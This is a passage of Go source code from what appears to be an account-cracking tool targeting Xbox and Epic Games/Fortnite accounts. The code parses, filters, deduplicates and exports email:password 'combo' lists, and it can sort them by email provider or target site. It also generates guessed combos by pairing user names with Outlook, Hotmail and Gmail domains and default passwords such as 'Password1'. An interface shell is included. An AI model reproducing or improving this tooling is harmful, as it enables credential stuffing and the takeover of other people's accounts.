	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	fl, _ := w.(stdhttp.Flusher)
	send := func(m map[string]any) {
		b, _ := json.Marshal(m)
		fmt.Fprintf(w, "data: %s\n\n", b)
		if fl != nil {
			fl.Flush()
		}
	}
	res := analyzeEditorSourceLive(path, "", send)
	res["done"] = true
	send(res)
}

func analyzeEditorSource(path, inline string) map[string]any {
	return analyzeEditorSourceLive(path, inline, nil)
}

func analyzeEditorSourceLive(path, inline string, live func(map[string]any)) map[string]any {
	var (
		r    io.Reader
		size int64
		src  = path
		f    *os.File
	)
	if p := resolveLocalFile(strings.TrimSpace(path)); p != "" {
		var err error
		f, err = os.Open(p)
		if err != nil {
			return map[string]any{"ok": false, "error": err.Error(), "path": p, "lines": 0, "size": 0}
		}
		defer f.Close()
		if st, e := f.Stat(); e == nil {
			size = st.Size()
		}
		src = p
		r = f
	}
	if r == nil {
		if strings.TrimSpace(path) != "" && inline == "" {
			return map[string]any{"ok": false, "error": "file not found: " + path, "path": path, "lines": 0, "size": 0}
		}
		r = strings.NewReader(inline)
		size = int64(len(inline))
		src = path
	}
	dom := map[string]int{}
	host := map[string]int{}
	kindN := map[string]int{}
	var comboLines, rawN int
	sc := editorScanner(r)
	for sc.Scan() {
		ln := sc.Bytes()
		rawN++
		if len(bytes.TrimSpace(ln)) == 0 || ln[0] == '#' {
			continue
		}
		comboLines++
		edom, hst := peekEmailHost(ln)
		if edom != "" {
			if _, ok := dom[edom]; ok || len(dom) < 4000 {
				dom[edom]++
			}
			kindN["email"]++
		}
		if hst != "" {
			if _, ok := host[hst]; ok || len(host) < 4000 {
				host[hst]++
			}
			kindN["ulp"]++
		}
		if live != nil && rawN%8000 == 0 {
			live(map[string]any{
				"ok": true, "path": src, "lines": comboLines, "raw": rawN, "size": size,
				"large": size > 2<<20, "kinds": kindN,
				"domains": sortCountsN(dom, 10), "urls": sortCountsN(host, 10), "done": false,
			})
		}
	}
	if comboLines > 0 && len(kindN) == 0 {
		kindN["ulp"] = comboLines
	}
	big := size > 2<<20
	return map[string]any{
		"ok":       true,
		"path":     src,
		"lines":    comboLines,
		"raw":      rawN,
		"size":     size,
		"large":    big,
		"kinds":    kindN,
		"domains":  sortCountsN(dom, 800),
		"urls":     sortCountsN(host, 800),
	}
}

func analyzeEditorText(text, path string) map[string]any {
	return analyzeEditorSource(path, text)
}

func handleEditorAnalyze(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req struct {
		Path string `json:"path"`
		Text string `json:"text"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	p := resolveLocalFile(strings.TrimSpace(req.Path))
	if strings.TrimSpace(req.Text) == "" && (p == "" || !fileExists(p)) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "file not found: " + req.Path})
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(analyzeEditorSource(req.Path, req.Text))
}

func handleEditorExtract(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req struct {
		Path string `json:"path"`
		Text string `json:"text"`
		Dest      string `json:"dest"`
		Banner    string `json:"banner"`
		BannerEnd string `json:"banner_end"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	src := resolveLocalFile(req.Path)
	dest := strings.TrimSpace(req.Dest)
	if dest == "" {
		if src != "" {
			dest = strings.TrimSuffix(src, filepath.Ext(src)) + "-extracted.txt"
		} else {
			dest = "combos-extracted.txt"
		}
	}
	var reader io.Reader
	var size int64
	if src != "" && fileExists(src) {
		f, err := os.Open(src)
		if err != nil {
			stdhttp.Error(w, err.Error(), 400)
			return
		}
		defer f.Close()
		if st, e := f.Stat(); e == nil {
			size = st.Size()
		}
		reader = f
	} else {
		reader = strings.NewReader(req.Text)
		size = int64(len(req.Text))
	}
	out, err := os.Create(dest)
	if err != nil {
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	defer out.Close()
	bw := bufio.NewWriterSize(out, 1<<20)
	if b := strings.TrimSpace(req.Banner); b != "" {
		_, _ = bw.WriteString(strings.TrimRight(b, "\n") + "\n")
	}
	dedup := size > 0 && size < 80<<20
	var seen map[string]struct{}
	if dedup {
		seen = map[string]struct{}{}
	}
	n := 0
	sc := editorScanner(reader)
	for sc.Scan() {
		e, p := comboUserPass(sc.Text())
		if e == "" || p == "" {
			continue
		}
		row := e + ":" + p
		if seen != nil {
			lk := strings.ToLower(row)
			if _, ok := seen[lk]; ok {
				continue
			}
			seen[lk] = struct{}{}
		}
		_, _ = bw.WriteString(row)
		_ = bw.WriteByte('\n')
		n++
	}
	if b := strings.TrimSpace(req.BannerEnd); b != "" {
		_, _ = bw.WriteString(strings.TrimRight(b, "\n") + "\n")
	}
	_ = bw.Flush()
	res := analyzeEditorSource(dest, "")
	res["extracted"] = n
	res["path"] = dest
	res["dest"] = dest
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(res)
}

type editorFilterReq struct {
	Path         string
	Text         string
	Dest         string
	EmailDomains []string
	EmailTypes   string
	Hosts        []string
	URL          string
	Contains     string
	Banner       string
	BannerEnd    string
	CountOnly    bool
}

func runEditorFilter(req editorFilterReq, live func(map[string]any)) map[string]any {
	src := resolveLocalFile(req.Path)
	dest := strings.TrimSpace(req.Dest)
	if dest == "" {
		dest = "combos-filtered.txt"
		if src != "" {
			dest = strings.TrimSuffix(src, filepath.Ext(src)) + "-filtered.txt"
		}
	}
	wantE := map[string]bool{}
	for _, d := range req.EmailDomains {
		d = strings.ToLower(strings.TrimSpace(strings.TrimPrefix(d, "@")))
		if d != "" {
			wantE[d] = true
		}
	}
	for _, bit := range strings.FieldsFunc(req.EmailTypes, func(r rune) bool {
		return r == ',' || r == ' ' || r == ';' || r == '\n'
	}) {
		bit = strings.ToLower(strings.TrimSpace(strings.TrimPrefix(bit, "@")))
		if bit != "" {
			wantE[bit] = true
		}
	}
	urlNeed := strings.ToLower(strings.TrimSpace(req.URL))
	urlNeed = strings.TrimPrefix(urlNeed, "https://")
	urlNeed = strings.TrimPrefix(urlNeed, "http://")
	urlNeed = strings.TrimPrefix(urlNeed, "www.")
	if slash := strings.Index(urlNeed, "/"); slash >= 0 {
		urlNeed = urlNeed[:slash]
	}
	var reader io.Reader
	var size int64
	if src != "" && fileExists(src) {
		f, err := os.Open(src)
		if err != nil {
			return map[string]any{"ok": false, "error": err.Error()}
		}
		defer f.Close()
		if st, e := f.Stat(); e == nil {
			size = st.Size()
		}
		reader = f
	} else {
		reader = strings.NewReader(req.Text)
		size = int64(len(req.Text))
	}
	var bw *bufio.Writer
	if !req.CountOnly {
		out, err := os.Create(dest)
		if err != nil {
			return map[string]any{"ok": false, "error": err.Error()}
		}
		defer out.Close()
		bw = bufio.NewWriterSize(out, 1<<20)
		if b := strings.TrimSpace(req.Banner); b != "" {
			_, _ = bw.WriteString(strings.TrimRight(b, "\n") + "\n")
		}
	}
	n, scanned := 0, 0
	emailHits := map[string]int{}
	sc := editorScanner(reader)
	for sc.Scan() {
		ln := sc.Text()
		scanned++
		low := strings.ToLower(ln)
		if urlNeed != "" && !strings.Contains(low, urlNeed) {
			if live != nil && scanned%20000 == 0 {
				live(map[string]any{"ok": true, "extracted": n, "scanned": scanned, "size": size, "domains": sortCountsN(emailHits, 10), "done": false})
			}
			continue
		}
		e, p := comboUserPass(ln)
		if e == "" || p == "" {
			continue
		}
		ed := emailDomain(e)
		if len(wantE) > 0 {
			okE := false
			for t := range wantE {
				if strings.Contains(t, ".") {
					if ed == t {
						okE = true
						break
					}
				} else if ed == t || strings.HasPrefix(ed, t+".") {
					okE = true
					break
				}
			}
			if !okE {
				continue
			}
		}
		if ed != "" {
			emailHits[ed]++
		}
		if bw != nil {
			_, _ = bw.WriteString(e + ":" + p + "\n")
		}
		n++
		if live != nil && (n%25 == 0 || scanned%15000 == 0) {
			live(map[string]any{"ok": true, "extracted": n, "scanned": scanned, "size": size, "domains": sortCountsN(emailHits, 10), "done": false})
		}
	}
	if bw != nil {
		if b := strings.TrimSpace(req.BannerEnd); b != "" {
			_, _ = bw.WriteString(strings.TrimRight(b, "\n") + "\n")
		}
		_ = bw.Flush()
	}
	return map[string]any{
		"ok": true, "extracted": n, "scanned": scanned, "size": size,
		"dest": dest, "path": dest, "domains": sortCountsN(emailHits, 200), "done": true,
	}
}

func handleEditorFilterStream(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	fl, _ := w.(stdhttp.Flusher)
	send := func(m map[string]any) {
		b, _ := json.Marshal(m)
		fmt.Fprintf(w, "data: %s\n\n", b)
		if fl != nil {
			fl.Flush()
		}
	}
	res := runEditorFilter(editorFilterReq{
		Path:       r.URL.Query().Get("path"),
		EmailTypes: r.URL.Query().Get("email_types"),
		URL:        r.URL.Query().Get("url"),
		CountOnly:  true,
	}, send)
	res["done"] = true
	send(res)
}

func handleEditorFilter(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req editorFilterReq
	var raw struct {
		Path         string   `json:"path"`
		Text         string   `json:"text"`
		Dest         string   `json:"dest"`
		EmailDomains []string `json:"email_domains"`
		EmailTypes   string   `json:"email_types"`
		Hosts        []string `json:"hosts"`
		URL          string   `json:"url"`
		Contains     string   `json:"contains"`
		Banner       string   `json:"banner"`
		BannerEnd    string   `json:"banner_end"`
		CountOnly    bool     `json:"count_only"`
	}
	_ = json.NewDecoder(r.Body).Decode(&raw)
	req.Path = raw.Path
	req.Text = raw.Text
	req.Dest = raw.Dest
	req.EmailDomains = raw.EmailDomains
	req.EmailTypes = raw.EmailTypes
	req.Hosts = raw.Hosts
	req.URL = raw.URL
	req.Contains = raw.Contains
	req.Banner = raw.Banner
	req.BannerEnd = raw.BannerEnd
	req.CountOnly = raw.CountOnly
	res := runEditorFilter(req, nil)
	if ok, _ := res["ok"].(bool); !ok {
		if err, _ := res["error"].(string); err != "" {
			stdhttp.Error(w, err, 400)
			return
		}
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(res)
}

func handleEditorGenerate(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req struct {
		Users     string `json:"users"`
		Domains   string `json:"domains"`
		Passwords string `json:"passwords"`
		Count     int    `json:"count"`
		Sep       string `json:"sep"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	split := func(s string) []string {
		var out []string
		for _, ln := range strings.FieldsFunc(s, func(r rune) bool {
			return r == '\n' || r == '\r' || r == ',' || r == ';'
		}) {
			ln = strings.TrimSpace(ln)
			if ln != "" {
				out = append(out, ln)
			}
		}
		return out
	}
	users := split(req.Users)
	doms := split(req.Domains)
	passes := split(req.Passwords)
	if len(doms) == 0 {
		doms = []string{"outlook.com", "hotmail.com", "gmail.com"}
	}
	if len(passes) == 0 {
		passes = []string{"Password1"}
	}
	sep := req.Sep
	if sep == "" {
		sep = ":"
	}
	if req.Count <= 0 {
		req.Count = 100
	}
	if req.Count > 200000 {
		req.Count = 200000
	}
	var out []string
	seen := map[string]bool{}
	for _, u := range users {
		u = strings.TrimSpace(u)
		if u == "" {
			continue
		}
		local := u
		if strings.Contains(u, "@") {
			local = u[:strings.Index(u, "@")]
		}
		local = strings.ToLower(strings.ReplaceAll(local, " ", ""))
		for _, d := range doms {
			d = strings.TrimPrefix(strings.ToLower(strings.TrimSpace(d)), "@")
			for _, pw := range passes {
				row := local + "@" + d + sep + pw
				if seen[row] {
					continue
				}
				seen[row] = true
				out = append(out, row)
				if len(out) >= req.Count {
					break
				}
			}
			if len(out) >= req.Count {
				break
			}
		}
		if len(out) >= req.Count {
			break
		}
	}
	joined := strings.Join(out, "\n")
	res := analyzeEditorText(joined, "")
	res["text"] = joined
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(res)
}

func handleEditorSave(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req struct {
		Path   string `json:"path"`
		Text   string `json:"text"`
		Banner    string `json:"banner"`
		BannerEnd string `json:"banner_end"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	path := strings.TrimSpace(req.Path)
	if path == "" {
		path = filepath.Join(".", "combos-export.txt")
	}
	body := req.Text
	if b := strings.TrimSpace(req.Banner); b != "" {
		body = strings.TrimRight(b, "\n") + "\n" + body
	}
	if b := strings.TrimSpace(req.BannerEnd); b != "" {
		body = strings.TrimRight(body, "\n") + "\n" + strings.TrimRight(b, "\n") + "\n"
	}
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "path": path})
}

func handleEditorBanners(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method == stdhttp.MethodPost {
		var b editorBanner
		_ = json.NewDecoder(r.Body).Decode(&b)
		if strings.TrimSpace(b.Name) == "" {
			b.Name = "Banner"
		}
		list := loadEditorBanners()
		found := false
		for i := range list {
			if strings.EqualFold(list[i].Name, b.Name) {
				list[i] = b
				found = true
				break
			}
		}
		if !found {
			list = append(list, b)
		}
		saveEditorBanners(list)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "banners": list})
		return
	}
	if r.Method == stdhttp.MethodDelete {
		name := strings.TrimSpace(r.URL.Query().Get("name"))
		list := loadEditorBanners()
		out := list[:0]
		for _, b := range list {
			if name != "" && strings.EqualFold(b.Name, name) {
				continue
			}
			out = append(out, b)
		}
		saveEditorBanners(out)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "banners": out})
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "banners": loadEditorBanners()})
}

func handleValidViewer(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = io.WriteString(w, viewerHTML)
}

func handleGUI(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = io.WriteString(w, guiHTML)
}

const guiHTML = `<!DOCTYPE html>
<html><head>
<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAHT0lEQVR42sWXy6tkVxXGf2ufZz1OVd3q++rcR78CkUgSExDFmUiEgEEjioriP+HEgQMHokNBh05EcSDiSEhwJARxYCLYSSRG26S7b9/OfXTdeled197LwanuW7fbDh0NeKAoDufss7797fWtby3Zuvwx5f94+R/qbVn86+J3/7Pl5x8pAKk+qiWoKngKHoi3iGcBC5SCEQHvdM3/DkBAS0GNxW8LURJSi2pEXohZILBYcpsxT1PScY4dK2IN4t8F8XA0HwxAwVkl6CrtcwmdoEstqOPFggYWFVdhVIPkHi5T5q0Z/fKEwfGEsg/GCBh9KBv+Qym3oJ6SXAjZrG/S9JsUnZSx9piOZqS9AptXALxQiJoBSatBUxJ2hrt0Hptw2Dlgspcj1lTH9h9AyAMquBs8cKxcbvKY2cbrOE78O/TeHTE/KHGZLPLtNOsUMJESb/qsXknoFuvYgXCg+5z8awKFgHkUAApqlO7jdbblAuXmjNuDQwZvpFAK4oP4sqQGBZFqnVNcDhIqnadDtrpb+Ic1bpU36V2bIE5OMS8ur7Wy+v3l3Ttb0b4TXMBuzrl+Y587f0yRRQDxhHKi2LnDFYqIYOcLVZhKGXYK43dypt6YxrmYTtllVhuT9x1iHpYDUsks6MJGfRPTcdw8OiA/tlz6VoKq4jLovZ6y+pmIIPEoBo7RPzKSxyMGb+bYVDEhbHwuJmh6FGPLoHaMv9dmc32T6yt7lH2W1HEfAyqO7lbCWrRGr3bE4Z/HPP29VWprIX7NY/6+o/NcyIUXO2gh7LyYgBG2X2hx+OqcfGDZ/WqTi1/qoJlw6esdBldzirJgLVgn8+fMBxmydA6nhFjwWtAJuhSdlON/jggSQ307QHFIoJRpSetKyHu/HHH1B4fMDgq8Osz2Smb7BVoqrScibv52wtUfHTI/Khi8kTE4HlMmKZ2gg5csCpcsAxBwqsTNkLpfY6IjsmNLMYA3f9jj4A8z6jsBW59vEXUN0SZc/GaCH3l4kcFvw7lPhXSeCqmt+ag62h8PMZ5g547s0DHSIXW/QZyEVTU9kwMKeEotqmFiYTKZUY6Vjc9GbL2QgIKdCDd+M2T10xHdZ2qIL+z/foKpO+JVn8tf63D0p5TDV2dsf6HJzlcaFH1HPnZghcl4ykq0RhxFTLwMVO4D4CuhH0LgyHoFfsMQNkNu/27G5GZB1itxuTJ8O8WVSrTmcfnbbYzxePvHfeaHBV5Yaf32K1OaF0PKiUOdQzCkkwJdc0ReVCVhWTF/TwViwMfDGYctHFrA/itj1CkmNBgfvNhgS8eT3+niZvDeL8aAcuEbTfzY4+8/OcH4gk2V/hspYsDEgpZgM4cai2f8MwXJnCmBsmwait8QgqbBBBXAcuZoPRHw2PNNwoZPMS0pZiVB0+P8803aT8SUc8X44NcFE8mZ8qsf5AXqFKsWsR5eaACLuqVVizrR2A3I3ne887MeT363i1HD2z/t0XkyprEb0PvrHJBq7ZIRepHBOA+rFtz9AKTy8qzMMIVHlPiMyBHkLGqj5CfK3ssTtl9qsPpsDYDdL7a49fKEvG8fqHSyqC9RI0YKQ1amaLkge1mGWGGezXGZ0mzWMZGgelow1IHf8Dj5S8p0L2P3pRZ27rBzy+6XE2Y3Su68PsOvm9PdI5VVRJC0GthUmWcZ2FNPOE1CEbJJwaw1I5E28fkB8+v29BwV3MJ+h29lXP/ViO5zMarQf23G4G8pGEEMS/RX5Tu+ZEi0zdROyMY5Iqe5cU+G4kE5UvrrJ+wMLrB6ucXerf694BJCcyegmDqyI8u1nw/xfz3GBIKKokWVqLYAEy7MWgWCktWLXbxhzKA4xI5PW7kHzEisYXhnSuf8iG6+xuQTM05eyxDg3LMx0YpP0DYUE1ftrlDKmZJcChhfz4k6flUr3sqZH5TYwtH5ZMS5fINxOWR0ZwpuIX69X4ZauVRxohxOD7EjYat9nvYzAeXcYWeKRJAeWVAhXg+I2j5h4mFTqG+EhCs+xjPkJw6bO5pPGbZb25Rj5Wh6RNnXM074kIakakC7V5psm13K9ZTbw31OrqYEQYA6rRLLq6TrRYZy7jCL8y+mCpFj5emQrdY25k7Mvr1B/9qsOhJ5xJaMQOlcbnDe28JvwUl0zPG1IelBiWZy+jFX8agoEirxlsfqpTbn8g3KofK+vcXg3RmUj9qSISAKVlDjaO6ErDc2SPwWtp0yZsR4PCUbF5R55at+KMRJSDNpkGgLbxQzskOOJ0dM9nJwUiXeIzWly0y4imZ/BVprTTrBCnW/gRcKGjicV+nNWIOUHjZzzMopg6LP6Hhanbl5kPZHmAtk0WxWDWjZh95wzDCZVINJHBOaEN94oILVktzmzLOUdFxgx7rYtfy3k9FZBxG/Gj7cEKaDnKmXVZTe1bOrfAIriCwC+4tNfCSzoZ6+bZCqmbg7D96rpECwFFT1ww2nIg/Sdbd1ElmY0tL92XOtpIku3lU9a4X3xVj+7r8BlkmlCPOtpkAAAAAASUVORK5CYII="/>
<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAHT0lEQVR42sWXy6tkVxXGf2ufZz1OVd3q++rcR78CkUgSExDFmUiEgEEjioriP+HEgQMHokNBh05EcSDiSEhwJARxYCLYSSRG26S7b9/OfXTdeled197LwanuW7fbDh0NeKAoDufss7797fWtby3Zuvwx5f94+R/qbVn86+J3/7Pl5x8pAKk+qiWoKngKHoi3iGcBC5SCEQHvdM3/DkBAS0GNxW8LURJSi2pEXohZILBYcpsxT1PScY4dK2IN4t8F8XA0HwxAwVkl6CrtcwmdoEstqOPFggYWFVdhVIPkHi5T5q0Z/fKEwfGEsg/GCBh9KBv+Qym3oJ6SXAjZrG/S9JsUnZSx9piOZqS9AptXALxQiJoBSatBUxJ2hrt0Hptw2Dlgspcj1lTH9h9AyAMquBs8cKxcbvKY2cbrOE78O/TeHTE/KHGZLPLtNOsUMJESb/qsXknoFuvYgXCg+5z8awKFgHkUAApqlO7jdbblAuXmjNuDQwZvpFAK4oP4sqQGBZFqnVNcDhIqnadDtrpb+Ic1bpU36V2bIE5OMS8ur7Wy+v3l3Ttb0b4TXMBuzrl+Y587f0yRRQDxhHKi2LnDFYqIYOcLVZhKGXYK43dypt6YxrmYTtllVhuT9x1iHpYDUsks6MJGfRPTcdw8OiA/tlz6VoKq4jLovZ6y+pmIIPEoBo7RPzKSxyMGb+bYVDEhbHwuJmh6FGPLoHaMv9dmc32T6yt7lH2W1HEfAyqO7lbCWrRGr3bE4Z/HPP29VWprIX7NY/6+o/NcyIUXO2gh7LyYgBG2X2hx+OqcfGDZ/WqTi1/qoJlw6esdBldzirJgLVgn8+fMBxmydA6nhFjwWtAJuhSdlON/jggSQ307QHFIoJRpSetKyHu/HHH1B4fMDgq8Osz2Smb7BVoqrScibv52wtUfHTI/Khi8kTE4HlMmKZ2gg5csCpcsAxBwqsTNkLpfY6IjsmNLMYA3f9jj4A8z6jsBW59vEXUN0SZc/GaCH3l4kcFvw7lPhXSeCqmt+ag62h8PMZ5g547s0DHSIXW/QZyEVTU9kwMKeEotqmFiYTKZUY6Vjc9GbL2QgIKdCDd+M2T10xHdZ2qIL+z/foKpO+JVn8tf63D0p5TDV2dsf6HJzlcaFH1HPnZghcl4ykq0RhxFTLwMVO4D4CuhH0LgyHoFfsMQNkNu/27G5GZB1itxuTJ8O8WVSrTmcfnbbYzxePvHfeaHBV5Yaf32K1OaF0PKiUOdQzCkkwJdc0ReVCVhWTF/TwViwMfDGYctHFrA/itj1CkmNBgfvNhgS8eT3+niZvDeL8aAcuEbTfzY4+8/OcH4gk2V/hspYsDEgpZgM4cai2f8MwXJnCmBsmwait8QgqbBBBXAcuZoPRHw2PNNwoZPMS0pZiVB0+P8803aT8SUc8X44NcFE8mZ8qsf5AXqFKsWsR5eaACLuqVVizrR2A3I3ne887MeT363i1HD2z/t0XkyprEb0PvrHJBq7ZIRepHBOA+rFtz9AKTy8qzMMIVHlPiMyBHkLGqj5CfK3ssTtl9qsPpsDYDdL7a49fKEvG8fqHSyqC9RI0YKQ1amaLkge1mGWGGezXGZ0mzWMZGgelow1IHf8Dj5S8p0L2P3pRZ27rBzy+6XE2Y3Su68PsOvm9PdI5VVRJC0GthUmWcZ2FNPOE1CEbJJwaw1I5E28fkB8+v29BwV3MJ+h29lXP/ViO5zMarQf23G4G8pGEEMS/RX5Tu+ZEi0zdROyMY5Iqe5cU+G4kE5UvrrJ+wMLrB6ucXerf694BJCcyegmDqyI8u1nw/xfz3GBIKKokWVqLYAEy7MWgWCktWLXbxhzKA4xI5PW7kHzEisYXhnSuf8iG6+xuQTM05eyxDg3LMx0YpP0DYUE1ftrlDKmZJcChhfz4k6flUr3sqZH5TYwtH5ZMS5fINxOWR0ZwpuIX69X4ZauVRxohxOD7EjYat9nvYzAeXcYWeKRJAeWVAhXg+I2j5h4mFTqG+EhCs+xjPkJw6bO5pPGbZb25Rj5Wh6RNnXM074kIakakC7V5psm13K9ZTbw31OrqYEQYA6rRLLq6TrRYZy7jCL8y+mCpFj5emQrdY25k7Mvr1B/9qsOhJ5xJaMQOlcbnDe28JvwUl0zPG1IelBiWZy+jFX8agoEirxlsfqpTbn8g3KofK+vcXg3RmUj9qSISAKVlDjaO6ErDc2SPwWtp0yZsR4PCUbF5R55at+KMRJSDNpkGgLbxQzskOOJ0dM9nJwUiXeIzWly0y4imZ/BVprTTrBCnW/gRcKGjicV+nNWIOUHjZzzMopg6LP6Hhanbl5kPZHmAtk0WxWDWjZh95wzDCZVINJHBOaEN94oILVktzmzLOUdFxgx7rYtfy3k9FZBxG/Gj7cEKaDnKmXVZTe1bOrfAIriCwC+4tNfCSzoZ6+bZCqmbg7D96rpECwFFT1ww2nIg/Sdbd1ElmY0tL92XOtpIku3lU9a4X3xVj+7r8BlkmlCPOtpkAAAAAASUVORK5CYII="/>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Xbox Full Capture + Keyword Inboxer + Promos / Codes &amp; Epic Games / Fortnite Full Capture @solodolosouls</title>
<style>
:root{--bg:#07090e;--card:#121722;--line:#2a3348;--txt:#e8edf7;--mut:#8b97ad;--pur:#c084fc;--grn:#22c55e;--blu:#38bdf8;--acc:#7c5cff}
*{box-sizing:border-box}
body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b1430 0%,var(--bg) 55%);color:var(--txt);font-family:Segoe UI,system-ui,sans-serif}
.wrap{max-width:1040px;margin:0 auto;padding:18px 18px 40px}
body.wide-ui .wrap{max-width:min(1480px,96vw);padding:16px 28px 32px}
.desk-grid{display:grid;grid-template-columns:1fr;gap:8px 20px}
.run-split{display:grid;grid-template-columns:1fr;gap:12px}
@media(min-width:1100px){
  .desk-grid{grid-template-columns:1fr 1fr;align-items:start}
  .desk-grid .span2{grid-column:1/-1}
  .run-split{grid-template-columns:1fr 1fr}
  #setup.panel,#run.panel,#editor.panel{padding:22px 24px}
}

.brand{display:flex;gap:18px;justify-content:center;align-items:center;flex-wrap:wrap;margin-bottom:8px}
.brand svg{width:72px;height:72px;display:block}
.titles{text-align:center;margin:10px 0 18px}
.titles .t1{color:var(--grn);font-weight:800;font-size:16px}
.titles .t2{color:var(--pur);font-weight:800;font-size:16px}
.credit{display:flex;gap:8px;align-items:center;justify-content:center;color:var(--blu);font-weight:700}
.credit svg{width:18px;height:18px;display:block;flex:0 0 18px}
.panel{background:rgba(18,23,34,.92);border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:0 18px 50px rgba(0,0,0,.35)}
.grid2{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
@media(max-width:720px){.grid2{grid-template-columns:1fr}}
.choice{cursor:pointer;border:1px solid var(--line);background:#0e1320;border-radius:16px;padding:14px;text-align:left;color:#fff;min-height:118px;display:flex;flex-direction:column}
.choice:hover{border-color:var(--acc)}
.choice h3{margin:8px 0 4px}
.choice p{margin:0;color:var(--mut);font-size:13px;line-height:1.35}
.ico{width:36px;height:36px;border-radius:10px;display:grid;place-items:center;background:#1c2233;flex:0 0 36px}
.ico svg{width:18px;height:18px;display:block}
.ico.tg{width:42px;height:42px;border-radius:12px;background:transparent;padding:0}
.ico.tg svg{width:42px;height:42px}
label{display:block;margin:10px 0 6px;color:var(--mut);font-size:12px}
input{width:100%;padding:11px 12px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt)}
.row{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px;align-items:center}
button{border:0;border-radius:12px;padding:11px 16px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;gap:8px;align-items:center}
.primary{background:linear-gradient(180deg,#8b6cff,#6a45ff)}
.ghost{background:#1b2233;color:var(--txt)}
.ghost.on{background:linear-gradient(180deg,#8b6cff,#6a45ff)}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:14px 0}
.card{background:#0e1320;border:1px solid var(--line);border-radius:14px;padding:12px}
.muted{color:var(--mut);font-size:11px;letter-spacing:.04em}
 .log{min-height:280px;white-space:pre-wrap;background:#0c1018;border:1px solid var(--line);border-radius:12px;padding:10px;min-height:110px;max-height:220px;overflow:auto}
.sess{border:1px solid var(--line);border-radius:14px;padding:12px;margin:8px 0;cursor:pointer;background:#0e1320}
.sess.on{border-color:var(--grn)}
.tag{font-size:11px;padding:4px 8px;border-radius:999px;background:rgba(124,92,255,.15);color:#cbbfff;border:1px solid rgba(124,92,255,.35)}
.tag.green{background:rgba(61,220,151,.12);color:#9af0c8;border-color:rgba(61,220,151,.3)}
.tag.warn{background:rgba(255,176,32,.12);color:#ffd48a;border-color:rgba(255,176,32,.3)}
.tag.red{background:rgba(248,113,113,.14);color:#fca5a5;border-color:rgba(248,113,113,.4)}
.tag.blue{background:rgba(96,165,250,.14);color:#93c5fd;border-color:rgba(96,165,250,.4)}
.tag.orange{background:rgba(251,146,60,.14);color:#fdba74;border-color:rgba(251,146,60,.4)}
.tag.yellow{background:rgba(250,204,21,.14);color:#fde047;border-color:rgba(250,204,21,.4)}
.hide{display:none}
.drop{position:relative;display:inline-block}
.menu{position:absolute;left:0;top:42px;min-width:280px;max-width:420px;background:#0e1320;border:1px solid var(--line);border-radius:12px;padding:8px;z-index:30;display:none;box-shadow:0 12px 30px rgba(0,0,0,.4)}
.menu.on{display:block}
.menu div{padding:8px 10px;border-radius:8px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;gap:10px;white-space:nowrap}
.menu div:hover{background:#1c2233}
.menu .tag{flex:0 0 auto;white-space:nowrap}
.pages{display:flex;gap:8px;align-items:center;justify-content:space-between;margin-top:8px}
.tabs{display:flex;gap:8px;margin:12px 0 8px}
.tabs button{background:#1b2233}
.tabs button.on{background:linear-gradient(180deg,#8b6cff,#6a45ff)}
.ed-modal{position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;z-index:80;padding:18px}
.ed-modal.hide{display:none}
.ed-card{width:min(520px,100%);max-height:80vh;overflow:auto;background:#121722;border:1px solid var(--line);border-radius:16px;padding:16px}
.ed-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #222a3a}
.ed-item b{flex:1}
.ico-btn{width:34px;height:34px;border-radius:10px;background:#1b2233;display:grid;place-items:center;padding:0}
</style></head><body>
<input id="nativeCombo" type="file" accept=".txt,text/plain" style="position:fixed;left:-9999px;width:1px;height:1px"/>
